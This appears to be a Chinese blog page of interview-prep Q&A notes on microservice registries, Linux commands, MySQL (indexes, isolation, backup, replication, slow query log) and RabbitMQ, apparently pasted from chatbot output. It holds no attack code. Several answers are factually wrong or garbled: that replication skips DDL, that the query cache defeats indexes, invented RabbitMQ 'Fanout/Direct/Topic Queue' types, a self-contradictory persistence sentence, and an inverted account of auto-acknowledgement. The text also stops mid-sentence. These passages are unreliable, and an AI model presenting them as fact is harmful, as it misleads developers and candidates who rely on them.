id="如何实现微服务架构下的服务治理？常用的服务注册中心有哪些？它们的特点和适用场景是什么？"><a href="#如何实现微服务架构下的服务治理？常用的服务注册中心有哪些？它们的特点和适用场景是什么？" class="headerlink" title="如何实现微服务架构下的服务治理？常用的服务注册中心有哪些？它们的特点和适用场景是什么？"></a>如何实现微服务架构下的服务治理？常用的服务注册中心有哪些？它们的特点和适用场景是什么？</h3><p>微服务架构下的服务治理包括服务注册和发现、服务路由和负载均衡、服务监控和熔断等，通过这些手段实现服务的高可用和自动化管理。其中，服务注册和发现是服务治理的核心，常用的服务注册中心有以下几种：</p><ol><li>Eureka：Netflix 开源的服务注册中心，支持高可用、自动化管理和弹性伸缩等特性，适用于 Spring Cloud 微服务架构。</li><li>Consul：由 HashiCorp 开发的服务注册中心，支持多数据中心、健康检查、DNS 和 HTTP API 等特性，适用于各种语言和微服务架构。</li><li>ZooKeeper：Apache 开源的分布式协调服务，支持分布式锁、配置管理、命名服务等特性，适用于大规模分布式系统和 Hadoop 生态系统。</li><li>Nacos：阿里巴巴开源的服务注册中心，支持多协议注册、动态配置、服务路由和 DNS 解析等特性，适用于各种语言和微服务架构。</li></ol><p>这些服务注册中心都具有高可用、服务发现、健康检查、负载均衡和自动化管理等特性，具体适用场景和特点可以根据实际情况进行选择。同时，需要注重服务的监控和容错机制，及时发现和处理故障，保障服务的高可用性和可靠性。</p><h3 id="11-linux常用命令"><a href="#11-linux常用命令" class="headerlink" title="11.linux常用命令"></a>11.linux常用命令</h3><ol><li>cd：改变当前目录。</li><li>ls：列出当前目录中的文件和目录。</li><li>pwd：显示当前工作目录的路径。</li><li>mkdir：创建一个新目录。</li><li>touch：创建一个空文件或者更新一个已有的文件的时间戳。</li><li>cat：连接文件并打印到标准输出设备上。</li><li>cp：将文件或目录复制到另一个文件或目录中。</li><li>mv：将文件或目录移动到另一个位置。</li><li>rm：删除文件或目录。</li><li>chmod：更改文件或目录的权限。</li><li>chown：更改文件或目录的所有者。</li><li>ps：显示系统中正在运行的进程。</li><li>top：显示系统中正在运行的进程和系统资源的使用情况。</li><li>grep：在文件中搜索指定的模式。</li><li>find：在文件系统中查找文件。</li><li>tar：将文件打包成一个归档文件。</li><li>gzip：压缩文件。</li><li>unzip：解压缩文件</li></ol><h3 id="12-优化数据库的方案"><a href="#12-优化数据库的方案" class="headerlink" title="12.优化数据库的方案"></a>12.优化数据库的方案</h3><p>优化数据库可以从多个方面入手，以下是一些优化数据库的方案：</p><ol><li>硬件优化：升级服务器的CPU、内存和硬盘等硬件设备，提高整体性能和响应速度。</li><li>数据库设计优化：优化数据表设计，合理设计字段、索引和约束等。</li><li>SQL 语句优化：使用优化的 SQL 语句，例如减少使用子查询、使用正确的关键字等。</li><li>索引优化：合理设计索引，根据查询需求选择适当的索引类型。</li><li>缓存优化：使用缓存技术，例如将频繁查询的数据存储在缓存中，减少对数据库的访问次数。</li><li>分区表优化：将大型表按照业务逻辑和数据特性进行分区，提高查询性能。</li><li>服务器参数优化：根据数据库特性和负载情况，合理设置服务器参数，例如内存缓冲池大小、线程池大小等。</li><li>数据库连接池优化：使用数据库连接池，管理数据库连接的创建和销毁，提高连接的复用率。</li><li>数据库备份和恢复优化：选择合适的备份和恢复策略，保证数据的完整性和可恢复性。</li></ol><p>以上是一些优化数据库的方案，根据具体情况进行选择和实施。</p><h3 id="11-mysql索引失效的原因和解决方法"><a href="#11-mysql索引失效的原因和解决方法" class="headerlink" title="11.mysql索引失效的原因和解决方法"></a>11.mysql索引失效的原因和解决方法</h3><p>MySQL索引失效可能由多种原因导致，以下是一些常见原因和相应的解决方法：</p><ol><li>索引列上使用了函数：当在索引列上使用函数时，MySQL不能使用索引来加速查询，因为索引的值已经被函数处理过。解决方法是尽可能避免在索引列上使用函数，或者使用函数索引。</li><li>数据库中数据分布不均：当索引列的数据分布不均匀时，查询时可能会导致索引失效。解决方法是优化查询语句，使用更精确的查询条件，或者重新设计索引。</li><li>查询条件中包含不等于(!=)或不匹配(&lt;&gt;)操作符：不等于或不匹配操作符在索引列上的查询可能会导致索引失效。解决方法是尽可能避免在索引列上使用不等于或不匹配操作符。</li><li>使用LIKE操作符模糊查询：当使用LIKE操作符模糊查询时，MySQL可能无法使用索引来加速查询，因为LIKE操作符在索引列上需要进行模式匹配。解决方法是尽可能避免使用LIKE操作符，或者使用全文索引。</li><li>查询语句中使用了OR操作符：当查询语句中使用OR操作符时，MySQL可能无法使用索引来加速查询。解决方法是尽可能使用AND操作符，或者使用UNION操作符将多个查询合并为一个查询。</li><li>数据表使用了不合适的存储引擎：不同的存储引擎对索引的使用方式有所不同。如果数据表使用了不合适的存储引擎，可能会导致索引失效。解决方法是选择合适的存储引擎，如InnoDB。</li><li>数据表过度规范化：过度规范化可能会导致多表联接查询，从而导致索引失效。解决方法是重新设计数据表结构，尽可能避免多表联接查询。</li><li>查询缓存：当查询缓存生效时，MySQL可能无法使用索引来加速查询。解决方法是禁用查询缓存，或者使用更精确的查询条件。</li></ol><h3 id="—————————————————————————————————————————————————Mysql—————————————————————————————————————————————————"><a href="#—————————————————————————————————————————————————Mysql—————————————————————————————————————————————————" class="headerlink" title="—————————————————————————————————————————————————Mysql—————————————————————————————————————————————————"></a>—————————————————————————————————————————————————Mysql—————————————————————————————————————————————————</h3><h3 id="什么是-MySQL？它有哪些特点？"><a href="#什么是-MySQL？它有哪些特点？" class="headerlink" title="什么是 MySQL？它有哪些特点？"></a>什么是 MySQL？它有哪些特点？</h3><p>MySQL是一种开源的关系型数据库管理系统（RDBMS），它支持多用户、多线程，可用于各种规模的应用程序。以下是MySQL的主要特点：</p><ol><li>可靠性：MySQL非常可靠，能够在故障时自动恢复，也支持数据备份和恢复。</li><li>高性能：MySQL支持高并发和高负载，能够处理大量数据。</li><li>灵活性：MySQL支持多种存储引擎，可以根据应用程序的需求选择最合适的引擎。</li><li>安全性：MySQL提供了多层安全保护，包括用户权限管理、SSL加密、防火墙和入侵检测等。</li><li>开放性：MySQL是开源软件，用户可以自由使用、修改和分发，也可以参与社区的开发和维护。</li><li>易用性：MySQL具有友好的命令行工具和图形界面管理工具，方便用户进行数据库管理和维护。</li></ol><p>总之，MySQL是一个强大、可靠、高效、灵活、安全、开放和易用的关系型数据库管理系统，已经成为世界上最受欢迎的开源数据库之一。</p><h3 id="MySQL-中有哪些数据类型？它们分别用于什么场景？"><a href="#MySQL-中有哪些数据类型？它们分别用于什么场景？" class="headerlink" title="MySQL 中有哪些数据类型？它们分别用于什么场景？"></a>MySQL 中有哪些数据类型？它们分别用于什么场景？</h3><p>MySQL支持多种数据类型，包括以下几种：</p><ol><li>整型（Integer Types）：用于存储整数，包括TINYINT、SMALLINT、MEDIUMINT、INT、BIGINT等。不同类型的整型可以存储不同范围的整数值。</li><li>浮点数（Floating-Point Types）：用于存储浮点数，包括FLOAT和DOUBLE。FLOAT和DOUBLE分别占4个字节和8个字节，存储的范围和精度不同。</li><li>定点数（Fixed-Point Types）：用于存储带有小数位数的数字，包括DECIMAL和NUMERIC。DECIMAL和NUMERIC可以指定精度和小数位数，适用于对精度要求比较高的场景。</li><li>字符串（String Types）：用于存储字符串，包括CHAR、VARCHAR、TEXT、BLOB等。CHAR和VARCHAR是固定长度和可变长度的字符串类型，TEXT和BLOB用于存储大文本和二进制数据。</li><li>日期和时间（Date and Time Types）：用于存储日期和时间信息，包括DATE、TIME、DATETIME和TIMESTAMP等。</li><li>枚举（Enumeration Types）：用于存储枚举类型，可以选择枚举中的一个值作为字段值。</li><li>集合（Set Types）：用于存储一组值，可以从集合中选择多个值作为字段值。</li></ol><p>不同的数据类型适用于不同的场景，例如整型适用于存储数字，字符串适用于存储文本信息，日期和时间类型适用于存储日期和时间信息等。在选择数据类型时，需要考虑存储的数据范围、精度和存储空间等因素。</p><h3 id="MySQL-中如何进行事务管理？"><a href="#MySQL-中如何进行事务管理？" class="headerlink" title="MySQL 中如何进行事务管理？"></a>MySQL 中如何进行事务管理？</h3><p>在 MySQL 中，事务是一组数据库操作，它们被视为单个逻辑单元并且要么全部执行成功，要么全部回滚。MySQL 提供了以下两种事务管理方式：</p><ol><li><p>基于 SQL 语句的事务管理：</p><p>在 MySQL 中，使用 BEGIN 或 START TRANSACTION 命令来标记事务的开始。在事务内，所有的 INSERT、UPDATE 和 DELETE 操作都是针对事务执行的，而不是针对单个的数据行执行。最后，使用 COMMIT 或 ROLLBACK 命令来结束事务，根据执行结果决定是提交还是回滚所有的操作。</p></li><li><p>基于应用程序的事务管理：</p><p>应用程序级别的事务管理通常是通过编写代码来实现的。在这种情况下，开发人员需要在代码中显式地开启事务，执行相关操作，然后根据操作的成功与否来决定是提交还是回滚事务。</p></li></ol><p>无论是基于 SQL 语句还是基于应用程序的事务管理，都需要遵守事务的四个基本特性：原子性、一致性、隔离性和持久性。其中，原子性指整个事务中的所有操作要么全部执行成功，要么全部失败；一致性指事务结束时数据库必须保持一致状态；隔离性指在事务执行过程中，它所做的修改对其他事务是不可见的；持久性指事务结束后，其所做的修改会被永久保存在数据库中，即使出现故障也不会丢失。</p><h3 id="如何优化-MySQL-查询性能？"><a href="#如何优化-MySQL-查询性能？" class="headerlink" title="如何优化 MySQL 查询性能？"></a>如何优化 MySQL 查询性能？</h3><p>优化 MySQL 查询性能是数据库管理中一个重要的方面。以下是一些可能提高 MySQL 查询性能的建议：</p><ol><li>确保表有正确的索引：在查询时使用索引可以大大提高查询速度。索引应该根据数据使用情况来选择。可以使用 EXPLAIN 命令来分析查询计划，以帮助确定索引使用是否正确。</li><li>使用合适的查询：查询可以使用不同的语句，例如 SELECT、JOIN、UNION 和子查询。查询的复杂性越高，性能就越低。因此，应该选择最简单和最有效的查询语句来完成任务。</li><li>使用缓存：MySQL 有一个查询缓存，它可以缓存查询结果。如果查询相同的数据，则可以从缓存中读取结果，而不必重新执行查询。</li><li>避免使用通配符：查询中的通配符（如“%”和“_”）会导致查询效率降低，因为它们需要执行全表扫描。</li><li>分页查询时，使用 LIMIT：如果查询返回大量数据，则使用 LIMIT 来限制返回的数据量。</li><li>优化表结构：表结构的优化可以包括选择正确的数据类型、避免使用 NULL 值、规范化表结构等。这可以提高查询的性能并减少存储空间。</li><li>垂直分区：对于大型表，可以将表垂直分区为两个或多个表，以提高查询性能。</li><li>使用连接池：连接池可以减少创建和关闭连接的开销，并使连接可以重复使用，从而提高查询性能。</li></ol><p>这些是一些常见的 MySQL 查询性能优化建议。但是，对于具体的应用场景，还需要根据具体情况进行优化。</p><h3 id="如何使用索引提高查询性能？"><a href="#如何使用索引提高查询性能？" class="headerlink" title="如何使用索引提高查询性能？"></a>如何使用索引提高查询性能？</h3><p>使用索引可以大大提高MySQL的查询性能，以下是使用索引提高查询性能的几个方法：</p><ol><li>选择合适的数据类型：使用更小的数据类型来保存数据可以降低索引的大小，从而提高查询性能。</li><li>选择合适的索引类型：MySQL支持多种类型的索引，包括B-tree索引、哈希索引和全文索引等。根据实际情况选择适合的索引类型可以提高查询性能。</li><li>创建复合索引：当查询条件涉及多个列时，可以使用复合索引，它可以将多个列合并成一个索引，提高查询性能。</li><li>避免使用SELECT <em>：在查询时尽量避免使用SELECT </em>，因为这会导致查询不必要的数据，从而降低查询性能。</li><li>避免在WHERE子句中使用函数：在WHERE子句中使用函数会导致MySQL无法使用索引，从而降低查询性能。</li><li>对查询进行优化：使用EXPLAIN语句可以分析查询语句的执行计划，从而优化查询语句，提高查询性能。</li><li>定期分析表：通过定期分析表可以更新表的统计信息，从而优化查询执行计划，提高查询性能。</li></ol><p>总的来说，使用索引是提高MySQL查询性能的重要手段，但是在使用索引时也需要根据实际情况进行合理选择和使用，避免索引带来的不必要开销。</p><h3 id="MySQL-中的隔离级别是什么？各个隔离级别有什么不同？"><a href="#MySQL-中的隔离级别是什么？各个隔离级别有什么不同？" class="headerlink" title="MySQL 中的隔离级别是什么？各个隔离级别有什么不同？"></a>MySQL 中的隔离级别是什么？各个隔离级别有什么不同？</h3><p>MySQL中的隔离级别指的是多个事务同时操作同一个数据时的隔离程度，包括读未提交、读提交、可重复读和串行化四个级别。各个隔离级别的不同点如下：</p><ol><li>读未提交（Read Uncommitted）：最低的隔离级别，事务之间完全没有隔离，一个事务可以读取另一个事务未提交的数据。这种隔离级别很容易导致脏读、不可重复读和幻读的问题。</li><li>读提交（Read Committed）：事务只能读取已经提交的数据，可以避免脏读的问题。但是在同一个事务中，多次读取同一数据可能会出现不同的结果，称为不可重复读。</li><li>可重复读（Repeatable Read）：在同一个事务中，多次读取同一数据都会得到相同的结果，避免了不可重复读的问题。但是在这种隔离级别下，可能会出现幻读的问题，即一个事务读取了其他事务已提交的数据，但是在该事务提交前，另外的事务插入了新数据，导致该事务再次读取时出现新数据。</li><li>串行化（Serializable）：最高的隔离级别，完全避免了并发问题，事务串行执行，可以避免所有的并发问题。但是这种隔离级别下，效率非常低，通常不会采用。</li></ol><p>一般情况下，可重复读是MySQL的默认隔离级别，适用于大多数场景。但是对于高并发的系统，为了避免幻读的问题，可能需要将隔离级别调整为读提交或者使用更加高级的机制来避免并发问题。</p><h3 id="MySQL-中如何进行备份和恢复？"><a href="#MySQL-中如何进行备份和恢复？" class="headerlink" title="MySQL 中如何进行备份和恢复？"></a>MySQL 中如何进行备份和恢复？</h3><p>MySQL 数据库备份和恢复是数据库管理中的重要任务之一，以下是一些备份和恢复 MySQL 数据库的方法：</p><ol><li>备份：可以使用 mysqldump 命令来备份 MySQL 数据库。这个命令可以生成一个 SQL 脚本文件，其中包含了数据库的结构和数据。命令语法如下：</li></ol><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cssCopy <span class="selector-tag">code</span></span><br><span class="line">mysqldump -u <span class="selector-attr">[用户名]</span> -<span class="selector-tag">p</span> <span class="selector-attr">[密码]</span> <span class="selector-attr">[数据库名]</span> &gt; <span class="selector-attr">[备份文件名]</span><span class="selector-class">.sql</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>恢复：可以使用 MySQL 自带的命令行工具 mysql 来执行备份文件来进行数据恢复。命令语法如下：</li></ol><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cssCopy <span class="selector-tag">code</span></span><br><span class="line">mysql -u <span class="selector-attr">[用户名]</span> -<span class="selector-tag">p</span> <span class="selector-attr">[密码]</span> <span class="selector-attr">[数据库名]</span> &lt; <span class="selector-attr">[备份文件名]</span><span class="selector-class">.sql</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>使用物理备份：物理备份是将 MySQL 数据库文件复制到另一个位置的过程。可以使用文件系统备份工具进行备份，如 tar 或 rsync。恢复时，将备份文件复制到原始位置即可。</li><li>使用第三方备份工具：有一些第三方备份工具可以用于备份 MySQL 数据库，如 Percona XtraBackup 或 MySQL Enterprise Backup。</li></ol><p>在备份和恢复 MySQL 数据库时，需要注意以下几点：</p><ul><li>备份频率：需要根据业务需求和数据库变更频率定期备份数据库。</li><li>备份文件存储位置：需要将备份文件存储在可靠的位置，以防止丢失或损坏。</li><li>恢复测试：需要定期测试备份文件是否能够成功地恢复到数据库。</li><li>定期清理备份文件：需要定期清理过期的备份文件以释放存储空间。</li></ul><p>总之，备份和恢复 MySQL 数据库是一项重要的任务，需要认真考虑备份策略，并定期测试备份文件的恢复过程。</p><h3 id="MySQL-中如何进行主从复制？"><a href="#MySQL-中如何进行主从复制？" class="headerlink" title="MySQL 中如何进行主从复制？"></a>MySQL 中如何进行主从复制？</h3><p>MySQL主从复制是指将一个MySQL数据库实例的数据复制到另一个MySQL数据库实例的过程。其中，一个MySQL实例充当主服务器，另一个或多个实例充当从服务器。</p><p>主从复制的实现需要以下几个步骤：</p><ol><li>配置主服务器：首先，需要在主服务器上开启二进制日志（binary logging）功能，并配置一个唯一的服务器ID。这样，当有更新操作时，主服务器就会将更新操作记录到二进制日志中。</li><li>配置从服务器：从服务器需要配置与主服务器相同的MySQL版本，并配置一个唯一的服务器ID。然后，需要通过CHANGE MASTER TO命令告诉从服务器连接主服务器，并指定需要复制的二进制日志文件和位置。</li><li>启动复制进程：从服务器连接主服务器后，可以使用START SLAVE命令启动复制进程。从服务器将开始下载二进制日志并重放其中的更新操作。</li></ol><p>主从复制可以提高数据的可用性和可靠性，因为从服务器可以用于读取请求，而主服务器则负责写入数据。此外，当主服务器出现故障时，可以将从服务器提升为主服务器，从而继续提供服务。</p><p>要注意的是，主从复制只复制数据更改操作，并不复制表结构更改操作和其他DDL语句。此外，在复制过程中，可能会出现延迟现象，因为从服务器需要在接收到更新操作后才能执行。如果需要实时同步，可以使用MySQL的其他复制技术，如主主复制或环形复制。</p><h3 id="MySQL-中的慢查询日志是什么？如何开启和使用？"><a href="#MySQL-中的慢查询日志是什么？如何开启和使用？" class="headerlink" title="MySQL 中的慢查询日志是什么？如何开启和使用？"></a>MySQL 中的慢查询日志是什么？如何开启和使用？</h3><p>ySQL中的慢查询日志（Slow Query Log）是一种记录查询响应时间超过预设阈值的查询日志。通过分析慢查询日志，可以帮助我们了解查询性能问题，并进行优化。</p><p>要开启慢查询日志，需要在MySQL配置文件（my.cnf或my.ini）中设置slow_query_log选项，并指定一个慢查询日志文件的路径：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">makefileCopy code</span><br><span class="line">slow_query_log <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">slow_query_log_file <span class="operator">=</span> /path/to/slowquery.log</span><br><span class="line">long_query_time <span class="operator">=</span> <span class="number">2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>slow_query_log: 开启慢查询日志</li><li>slow_query_log_file: 慢查询日志文件路径</li><li>long_query_time: 定义慢查询的时间阈值，单位为秒，默认为10秒</li></ul><p>设置完毕后，重启MySQL服务使配置生效。</p><p>查询执行时间超过long_query_time的查询都会被记录到慢查询日志中。可以通过以下方法查看慢查询日志：</p><ol><li><p>通过命令行工具mysql执行以下命令查看慢查询日志：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sqlCopy code</span><br><span class="line"><span class="section">mysql&gt; SHOW VARIABLES LIKE &#x27;slow_query_log&#x27;;</span></span><br><span class="line"><span class="section">+----------------+-------+</span></span><br><span class="line"><span class="section">| Variable_name  | Value |</span></span><br><span class="line"><span class="section">+----------------+-------+</span></span><br><span class="line"><span class="section">| slow_query_log | ON    |</span></span><br><span class="line"><span class="section">+----------------+-------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="section">mysql&gt; SHOW VARIABLES LIKE &#x27;slow_query_log_file&#x27;;</span></span><br><span class="line"><span class="section">+---------------------+-----------------------------------+</span></span><br><span class="line"><span class="section">| Variable_name       | Value                             |</span></span><br><span class="line"><span class="section">+---------------------+-----------------------------------+</span></span><br><span class="line"><span class="section">| slow_query_log_file | /usr/local/mysql/data/slowquery.log |</span></span><br><span class="line"><span class="section">+---------------------+-----------------------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM mysql.slow_log;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>直接查看慢查询日志文件：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellCopy code</span><br><span class="line">$ tail -f /<span class="type">path</span>/<span class="keyword">to</span>/slowquery.<span class="keyword">log</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>除了设置慢查询日志外，还可以通过使用EXPLAIN命令来分析查询执行计划，查看索引使用情况等信息，进一步优化查询性能。</p><h3 id="如何授权和撤销-MySQL-用户的权限？"><a href="#如何授权和撤销-MySQL-用户的权限？" class="headerlink" title="如何授权和撤销 MySQL 用户的权限？"></a>如何授权和撤销 MySQL 用户的权限？</h3><h3 id="—————————————————————————————————————————————————rabbitmq—————————————————————————————————————————————————"><a href="#—————————————————————————————————————————————————rabbitmq—————————————————————————————————————————————————" class="headerlink" title="—————————————————————————————————————————————————rabbitmq—————————————————————————————————————————————————"></a>—————————————————————————————————————————————————rabbitmq—————————————————————————————————————————————————</h3><h3 id="什么是-RabbitMQ？"><a href="#什么是-RabbitMQ？" class="headerlink" title="什么是 RabbitMQ？"></a>什么是 RabbitMQ？</h3><p>RabbitMQ是一个开源的消息代理（message broker），用于在应用程序之间传递数据。它使用AMQP（高级消息队列协议）作为消息传递的标准协议。RabbitMQ可以被用于许多不同的应用场景，例如解耦应用程序之间的通信、负载均衡、异步任务处理等等。</p><p>RabbitMQ的基本原理是：生产者（producer）将消息发送到RabbitMQ的交换机（exchange），然后交换机根据预定义的规则（例如路由键）将消息路由到队列（queue）中。消费者（consumer）订阅队列并从队列中接收消息。RabbitMQ提供了许多不同的交换机类型，例如直接交换机、主题交换机、头交换机等等，这些交换机类型可以根据实际需求进行选择。</p><p>在RabbitMQ中，消息传递的过程是异步的，这意味着生产者和消费者不需要同时在线。RabbitMQ提供了持久化机制，确保即使在消费者离线时，生产者发送的消息也不会丢失。此外，RabbitMQ还支持多个消费者同时从一个队列中消费消息，从而提高了系统的可扩展性和吞吐量。</p><h3 id="RabbitMQ-中的-Exchange-和-Queue-有什么作用？它们之间的关系是什么？"><a href="#RabbitMQ-中的-Exchange-和-Queue-有什么作用？它们之间的关系是什么？" class="headerlink" title="RabbitMQ 中的 Exchange 和 Queue 有什么作用？它们之间的关系是什么？"></a>RabbitMQ 中的 Exchange 和 Queue 有什么作用？它们之间的关系是什么？</h3><p>在 RabbitMQ 中，Exchange 和 Queue 是非常重要的概念，它们被用来实现消息的路由和传递。</p><p>Exchange 是消息的交换机，用于接收生产者发送的消息并将其路由到一个或多个与之绑定的 Queue 上。Exchange 有多种类型，包括 direct、fanout、topic 和 headers 等，每种类型都有不同的路由规则和应用场景。</p><p>Queue 是消息的缓存队列，用于存储接收到的消息，直到消费者获取并处理它们。Queue 可以绑定到一个或多个 Exchange 上，Exchange 将根据其类型和路由键将消息路由到 Queue 中，然后消费者可以从 Queue 中获取消息进行处理。</p><p>Exchange 和 Queue 之间的关系可以通过 Binding 进行定义，Binding 是一个关联 Exchange 和 Queue 的规则，它定义了 Exchange 将消息路由到哪个 Queue 上。Binding 可以指定一个或多个 routing key，用于确定消息应该路由到哪个 Queue 上。</p><p>因此，Exchange、Queue 和 Binding 是 RabbitMQ 中非常重要的概念，它们协同工作，实现了高效的消息传递和路由。</p><h3 id="RabbitMQ-中有哪些类型的-Exchange？"><a href="#RabbitMQ-中有哪些类型的-Exchange？" class="headerlink" title="RabbitMQ 中有哪些类型的 Exchange？"></a>RabbitMQ 中有哪些类型的 Exchange？</h3><p>在 RabbitMQ 中，Exchange 是消息路由的中心，负责接收来自生产者的消息并将其路由到一个或多个队列。Exchange 接收到消息后，需要将其路由到一个或多个队列，这是通过 Exchange 和 Queue 之间的绑定关系来实现的。Exchange 有四种类型：</p><ol><li>Direct Exchange（直接交换机）Direct Exchange 是 RabbitMQ 默认的交换机类型。当一个消息被发送到 Direct Exchange 时，会根据消息的 Routing Key（路由键）将消息路由到与之绑定的队列。</li><li>Fanout Exchange（扇形交换机）Fanout Exchange 将收到的所有消息广播到与之绑定的所有队列，不管消息的 Routing Key 是什么。</li><li>Topic Exchange（主题交换机）Topic Exchange 类似于 Direct Exchange，但允许使用通配符匹配 Routing Key。可以使用星号（*）匹配一个单词，或者使用井号（#）匹配多个单词。</li><li>Headers Exchange（头部交换机）Headers Exchange 根据消息的 Header（头部）属性进行路由，而不是根据 Routing Key。通常很少使用 Headers Exchange。</li></ol><h3 id="RabbitMQ-中有哪些类型的-Queue？"><a href="#RabbitMQ-中有哪些类型的-Queue？" class="headerlink" title="RabbitMQ 中有哪些类型的 Queue？"></a>RabbitMQ 中有哪些类型的 Queue？</h3><p>在 RabbitMQ 中，有以下几种类型的 Queue：</p><ol><li>Classic Queue：最基本的队列类型，可以在单个消息生产者和消费者之间传递消息。</li><li>Fanout Queue：可以将消息传递到多个消费者之间，它会将消息广播到所有与之绑定的队列。</li><li>Direct Queue：可以将消息传递到一个或多个与之绑定的队列，它使用消息中的路由键来决定将消息传递到哪些队列中。</li><li>Topic Queue：可以将消息传递到一个或多个与之绑定的队列，它使用消息中的路由键和通配符匹配规则来决定将消息传递到哪些队列中。</li><li>Headers Queue：可以将消息传递到一个或多个与之绑定的队列，它使用消息中的头部信息来决定将消息传递到哪些队列中。</li></ol><p>每种类型的队列都有其特定的用途和适用场景，开发者可以根据实际需求选择合适的队列类型来搭建 RabbitMQ 消息队列。</p><h3 id="RabbitMQ-中的消息是怎么发送的？"><a href="#RabbitMQ-中的消息是怎么发送的？" class="headerlink" title="RabbitMQ 中的消息是怎么发送的？"></a>RabbitMQ 中的消息是怎么发送的？</h3><p>在 RabbitMQ 中，消息的发送过程包括以下步骤：</p><ol><li>生产者创建一个连接到 RabbitMQ 服务器的通道（channel）。</li><li>生产者声明一个消息队列（queue），如果该队列不存在，则会自动创建一个新队列。</li><li>生产者将消息发送到该队列中。</li><li>RabbitMQ 将消息存储在该队列中，直到消费者从该队列中获取消息为止。</li><li>消费者创建一个连接到 RabbitMQ 服务器的通道。</li><li>消费者声明该队列，以便能够从该队列中获取消息。</li><li>消费者从该队列中获取消息并处理消息。</li></ol><p>在发送消息时，可以使用不同的交换机（exchange）类型来控制消息的路由行为。交换机决定了消息应该被发送到哪个队列，这个决策基于消息的路由键（routing key）和交换机类型。常见的交换机类型有：</p><ol><li>直接交换机（Direct exchange）：将消息路由到与消息的路由键完全匹配的队列中。</li><li>主题交换机（Topic exchange）：将消息路由到匹配通配符模式的队列中。</li><li>头交换机（Headers exchange）：将消息路由到满足指定头信息的队列中。</li><li>扇形交换机（Fanout exchange）：将消息路由到所有绑定到该交换机的队列中。</li></ol><p>在 RabbitMQ 中，生产者和消费者通过 AMQP（Advanced Message Queuing Protocol）协议进行通信，这是一种标准的消息传递协议，可用于消息队列系统的多种实现。</p><h3 id="RabbitMQ-中如何保证消息的可靠性？"><a href="#RabbitMQ-中如何保证消息的可靠性？" class="headerlink" title="RabbitMQ 中如何保证消息的可靠性？"></a>RabbitMQ 中如何保证消息的可靠性？</h3><p>RabbitMQ 通过多种机制来保证消息的可靠性：</p><ol><li>消息确认机制：在生产者发送消息时，可以开启消息确认机制。当 RabbitMQ 收到消息并将其存储在队列中后，会给生产者发送一个确认消息，表示消息已被成功存储。如果 RabbitMQ 无法将消息存储在队列中，则会给生产者发送一个拒绝消息。生产者可以在收到确认消息后才认为消息已经成功发送，从而避免消息丢失的情况。</li><li>消息持久化：当 RabbitMQ 收到消息后，会将消息存储在内存中，然后在必要时将其写入磁盘。如果 RabbitMQ 在将消息写入磁盘之前崩溃，那么消息就会丢失。为了避免这种情况，可以将队列和消息标记为持久化的，这样 RabbitMQ 就会在将消息存储在磁盘上之前将其存储在磁盘上，从而确保消息不会丢失。</li><li>消费者应答机制：在消费者接收到消息并处理完毕后，会给 RabbitMQ 发送一个确认消息，表示消息已被成功处理。如果消费者在处理消息时出现了错误或者崩溃，那么 RabbitMQ 就会将该消息重新发送给其他消费者，从而确保消息不会丢失。</li><li>消息重试机制：如果 RabbitMQ 发现某个消息无法被消费者处理，就会将该消息重新发送给其他消费者。在重新发送之前，RabbitMQ 会根据配置的重试策略进行多次重试。如果消息在经过多次重试后仍然无法被消费者处理，那么就会将该消息发送到死信队列中，以便后续进行处理。</li></ol><p>通过以上机制的配合，RabbitMQ 能够有效地保证消息的可靠性，并避免消息丢失的情况。</p><h3 id="RabbitMQ-中如何处理消费者的异常退出？"><a href="#RabbitMQ-中如何处理消费者的异常退出？" class="headerlink" title="RabbitMQ 中如何处理消费者的异常退出？"></a>RabbitMQ 中如何处理消费者的异常退出？</h3><p>在 RabbitMQ 中，如果消费者出现异常退出，可以通过以下机制来处理：</p><ol><li>自动应答机制：如果消费者在处理消息时出现异常并崩溃，那么 RabbitMQ 就会将该消息重新发送给其他消费者，但是该消费者不会收到重新发送的消息。这是因为默认情况下，RabbitMQ 会将消息推送给消费者后自动确认，即自动发送一个确认消息给 RabbitMQ，表示该消息已被成功处理。如果消费者在处理消息时出现异常并崩溃，那么就无法发送确认消息，导致 RabbitMQ 认为该消息未被处理，从而将其重新发送给其他消费者。</li><li>手动应答机制：为了避免上述情况的发生，可以关闭自动应答机制，改为手动应答机制。在手动应答模式下，消费者必须在处理完消息后手动发送确认消息给 RabbitMQ，表示该消息已被成功处理。如果消费者在处理消息时出现异常并崩溃，那么就不会发送确认消息，从而导致 RabbitMQ 将该消息重新发送给其他消费者。另外，手动应答机制还可以设置消息的重新投递次数和重新投递间隔，以便控制消息的重试行为。</li><li>消息重试机制：如果消费者在处理消息时出现异常并崩溃，那么 RabbitMQ 会将该消息重新发送给其他消费者。在重新发送之前，RabbitMQ 